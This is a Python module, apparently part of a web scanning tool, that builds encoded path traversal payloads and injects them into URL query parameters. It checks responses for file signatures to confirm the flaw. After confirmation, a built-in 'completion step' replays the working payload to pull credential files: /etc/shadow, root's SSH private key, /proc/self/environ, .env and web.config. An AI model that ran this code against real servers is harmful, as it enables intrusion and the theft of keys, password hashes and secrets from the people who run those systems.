"""
Pure parsing/payload-building for path_traversal_probe: stack-agnostic
traversal payloads and file-signature matching. No I/O here.

Payloads are built from a (style, depth, relative file path) triple
rather than hand-written per file, so that once one style+depth is
confirmed working against the initial probe-file list, the exact same
style+depth can be replayed against a second, bounded list of
higher-value files (FOLLOWUP_FILES) -- the actual completion step,
done in execute.py once a confirmation lands.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse, urlunparse, parse_qsl, urlencode

DEFAULT_MAX_BODY_CHARS = 50000


# --- Encoding styles ---------------------------------------------------
# Each takes (depth, rel_path) where rel_path always uses forward
# slashes ("windows/win.ini", "etc/passwd") -- a style function is
# responsible for whatever separator/encoding its own variant needs.


def _style_raw(depth: int, rel_path: str) -> str:
    return "../" * depth + rel_path


def _style_url_encoded(depth: int, rel_path: str) -> str:
    return "..%2f" * depth + rel_path.replace("/", "%2f")


def _style_fully_encoded(depth: int, rel_path: str) -> str:
    return "%2e%2e%2f" * depth + rel_path.replace("/", "%2f")


def _style_double_url_encoded(depth: int, rel_path: str) -> str:
    return "..%252f" * depth + rel_path.replace("/", "%252f")


def _style_backslash(depth: int, rel_path: str) -> str:
    return "..\\" * depth + rel_path.replace("/", "\\")


def _style_backslash_encoded(depth: int, rel_path: str) -> str:
    return "..%5c" * depth + rel_path.replace("/", "%5c")


def _style_doubled_dot_bypass(depth: int, rel_path: str) -> str:
    return "....//" * depth + rel_path


def _style_absolute(depth: int, rel_path: str) -> str:
    # Depth is meaningless for an already-absolute path.
    return "/" + rel_path


STYLE_FUNCS: Dict[str, Callable[[int, str], str]] = {
    "raw": _style_raw,
    "url_encoded": _style_url_encoded,
    "fully_encoded": _style_fully_encoded,
    "double_url_encoded": _style_double_url_encoded,
    "backslash": _style_backslash,
    "backslash_encoded": _style_backslash_encoded,
    "doubled_dot_bypass": _style_doubled_dot_bypass,
    "absolute": _style_absolute,
}

# Which follow-up file family applies once a given style is confirmed --
# the backslash styles reach a Windows drive root, everything else
# reaches a Unix filesystem root.
WINDOWS_STYLES = ("backslash", "backslash_encoded")

# (style, depth, rel_path, file_description, signature). depth is
# ignored by the "absolute" style. Reproduces the original 10
# hand-written payloads exactly, now derived instead of transcribed.
_PROBE_FILES: List[Tuple[str, int, str, str, str]] = [
    ("raw", 7, "etc/passwd", "/etc/passwd (raw traversal)", "root:x:0:0:"),
    ("url_encoded", 6, "etc/passwd", "/etc/passwd (URL-encoded)", "root:x:0:0:"),
    ("fully_encoded", 6, "etc/passwd", "/etc/passwd (fully encoded)", "root:x:0:0:"),
    ("double_url_encoded", 6, "etc/passwd", "/etc/passwd (double URL-encoded)", "root:x:0:0:"),
    ("backslash", 6, "windows/win.ini", "C:\\windows\\win.ini (backslash)", "[fonts]"),
    ("backslash_encoded", 6, "windows/win.ini", "C:\\windows\\win.ini (encoded backslash)", "[fonts]"),
    ("absolute", 0, "etc/passwd", "/etc/passwd (absolute path)", "root:x:0:0:"),
    ("doubled_dot_bypass", 6, "etc/passwd", "/etc/passwd (traversal-filter bypass, doubled dots)", "root:x:0:0:"),
    ("raw", 6, "WEB-INF/web.xml", "WEB-INF/web.xml (Java/Spring)", "<web-app"),
    ("raw", 6, ".env", ".env (Node/general app config)", "APP_"),
]

# The completion step: once a style+depth is confirmed via one of the
# entries above, it is replayed against this second, fixed, bounded
# list instead of stopping at "traversal confirmed". Unix and Windows
# have separate lists since they share no filesystem layout.
UNIX_FOLLOWUP_FILES: List[Tuple[str, str]] = [
    ("proc/self/environ", "Process environment variables (proc/self/environ)"),
    ("var/www/html/.env", ".env (common PHP/Laravel docroot)"),
    ("root/.ssh/id_rsa", "root's SSH private key"),
    ("etc/shadow", "/etc/shadow (root password hashes)"),
]
UNIX_FOLLOWUP_SIGNATURES: Dict[str, str] = {
    "proc/self/environ": "PATH=",
    "var/www/html/.env": "APP_",
    "root/.ssh/id_rsa": "PRIVATE KEY",
    "etc/shadow": "root:$",
}

WINDOWS_FOLLOWUP_FILES: List[Tuple[str, str]] = [
    ("inetpub/wwwroot/web.config", "IIS/ASP.NET web.config"),
]
WINDOWS_FOLLOWUP_SIGNATURES: Dict[str, str] = {
    "inetpub/wwwroot/web.config": "<configuration",
}


@dataclass
class RawTraversalProbe:
    payload: str
    file_description: str
    status_code: int = 0
    url: str = ""
    body: str = ""
    error: Optional[str] = None
    # Set by execute() itself at the point it already has the matching
    # signature in hand -- callers never need to re-derive this via a
    # separate lookup against file_description or payload.
    confirmed: bool = False


@dataclass
class RawTraversalResult:
    target: str = ""
    parameter: str = ""
    probes: List[RawTraversalProbe] = field(default_factory=list)
    tested_count: int = 0
    # Populated only after a probe above is confirmed -- the harvested
    # follow-up files read with that same confirmed style+depth.
    followup_probes: List[RawTraversalProbe] = field(default_factory=list)
    confirmed_style: Optional[str] = None
    confirmed_depth: int = 0
    error: Optional[str] = None


def normalize_target_url(url: str) -> str:
    cleaned = (url or "").strip()
    if not cleaned:
        return ""
    if not (cleaned.startswith("http://") or cleaned.startswith("https://")):
        cleaned = f"https://{cleaned}"
    return cleaned


def build_traversal_payloads() -> List[Tuple[str, str, str, str, int]]:
    """Returns (payload, file_description, signature, style, depth) for
    every entry in the initial confirmation sweep."""
    return [
        (STYLE_FUNCS[style](depth, rel_path), desc, sig, style, depth)
        for style, depth, rel_path, desc, sig in _PROBE_FILES
    ]


def build_followup_payloads(style: str, depth: int) -> List[Tuple[str, str, str]]:
    """Returns (payload, file_description, signature) for the follow-up
    file list matching whichever family `style` belongs to, built with
    the exact style+depth that was just confirmed."""
    style_fn = STYLE_FUNCS[style]
    if style in WINDOWS_STYLES:
        files, signatures = WINDOWS_FOLLOWUP_FILES, WINDOWS_FOLLOWUP_SIGNATURES
    else:
        files, signatures = UNIX_FOLLOWUP_FILES, UNIX_FOLLOWUP_SIGNATURES
    return [
        (style_fn(depth, rel_path), desc, signatures[rel_path])
        for rel_path, desc in files
    ]


def build_probe_url(target_url: str, parameter: str, payload: str) -> str:
    """Injects payload as the value of `parameter` in the query string,
    adding the parameter if it isn't already present."""
    parsed = urlparse(target_url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    qs[parameter] = payload
    # Payload already contains the exact encoding we want (some payloads
    # are pre-encoded on purpose) -- quote with safe="%/.\\" so urlencode
    # doesn't re-encode the %-sequences or slashes we deliberately built.
    new_query = urlencode(qs, safe="%/.\\", quote_via=quote)
    return urlunparse(parsed._replace(query=new_query))


def check_traversal_response(body: str, signature: str) -> bool:
    return bool(body) and signature in body


def find_confirmed_probe(
    probes: List[RawTraversalProbe], payloads: List[Tuple[str, str, str, str, int]]
) -> Optional[Tuple[RawTraversalProbe, str, int]]:
    """Returns (probe, style, depth) for the probe whose body matched its
    own payload's signature, or None if none did. `payloads` must be the
    same ordered list execute() used, so each probe can be matched back
    to its signature/style/depth by its exact payload string."""
    by_payload = {p: (sig, style, depth) for p, _, sig, style, depth in payloads}
    for probe in probes:
        match = by_payload.get(probe.payload)
        if match and check_traversal_response(probe.body, match[0]):
            return probe, match[1], match[2]
    return None
